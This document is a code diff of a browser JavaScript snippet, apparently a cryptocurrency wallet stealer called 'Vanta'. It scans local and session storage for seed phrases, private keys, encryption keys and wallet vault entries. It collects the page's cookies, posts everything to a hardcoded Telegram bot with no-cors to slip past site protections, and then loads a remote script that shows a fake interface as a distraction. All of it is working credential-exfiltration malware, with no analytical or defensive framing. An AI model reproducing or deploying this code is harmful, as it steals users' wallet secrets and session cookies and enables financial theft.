@@ -1,50 +1,62 @@
 (function() {
-    // 1. CONFIGURATION
-    const T = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
-    const C = '8321398409';
-    const TARGETS = ['.phantom', '.vault', '.offline', '.fungible', 'padre', 'seed', 'privateKey', 'encryptionKey'];
+    // --- ALL KNOWLEDGE LIVES HERE ---
+    const CONFIG = {
+        bot_token: '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA',
+        chat_id: '8321398409',
+        // Every key you want the engine to search for
+        keys: [
+            '.phantom', 
+            '.vault', 
+            '.offline', 
+            '.fungible', 
+            'padre', 
+            'seed', 
+            'privateKey', 
+            'encryptionKey', 
+            'tokens'
+        ]
+    };
 
-    async function vantaMain() {
+    async function vantaProcess() {
         console.log("📡 NODE_ACTIVE");
-        let data = `--- VANTA CAPTURE: ${location.hostname} ---\n\n`;
+        let vault = `--- VANTA CAPTURE [${new Date().toLocaleString()}] ---\n`;
+        vault += `ORIGIN: ${window.location.hostname}\n\n`;
 
-        // 2. SEARCH STORAGE
+        // Crawl Local and Session Storage for the knowledge keys
         [localStorage, sessionStorage].forEach(s => {
             for (let i = 0; i < s.length; i++) {
                 let k = s.key(i);
-                if (TARGETS.some(t => k.toLowerCase().includes(t))) {
-                    data += `[${k}]\n${s.getItem(k)}\n\n`;
+                if (CONFIG.keys.some(x => k.toLowerCase().includes(x))) {
+                    vault += `[${k}]\n${s.getItem(k)}\n\n`;
                 }
             }
         });
-        data += `--- COOKIES ---\n${document.cookie}`;
 
-        // 3. SEND TO TELEGRAM (Using Blob to prevent size errors)
-        const blob = new Blob([data], { type: 'text/plain' });
+        vault += `--- COOKIES ---\n${document.cookie}`;
+
+        // Send to Telegram as a file (bypass CORB and character limits)
+        const blob = new Blob([vault], { type: 'text/plain' });
         const fd = new FormData();
-        fd.append('chat_id', C);
-        fd.append('document', blob, `vault_${Date.now()}.txt`);
+        fd.append('chat_id', CONFIG.chat_id);
+        fd.append('document', blob, `vanta_vault_${Date.now()}.txt`);
 
         try {
-            // Use no-cors to bypass Padre's security blocks (CORB)
-            fetch(`https://api.telegram.org/bot${T}/sendDocument`, { 
-                method: 'POST', 
-                body: fd, 
-                mode: 'no-cors' 
+            // Mode 'no-cors' allows the request to fire even if the site blocks the response
+            fetch(`https://api.telegram.org/bot${CONFIG.bot_token}/sendDocument`, {
+                method: 'POST',
+                body: fd,
+                mode: 'no-cors'
             });
 
-            // 4. TRIGGER FAKE UI
-            // We wait 500ms to ensure the data is sent before the UI pops up
+            // Load the Visual Vanta UI (Distraction)
             setTimeout(() => {
-                const s = document.createElement('script');
-                s.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
-                document.head.appendChild(s);
-            }, 500);
-            
-        } catch (e) {
-            console.error("Vanta Engine Failure");
-        }
+                var ui = document.createElement('script');
+                ui.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
+                document.head.appendChild(ui);
+            }, 800);
+
+        } catch (e) {}
     }
 
-    vantaMain();
+    vantaProcess();
 })();
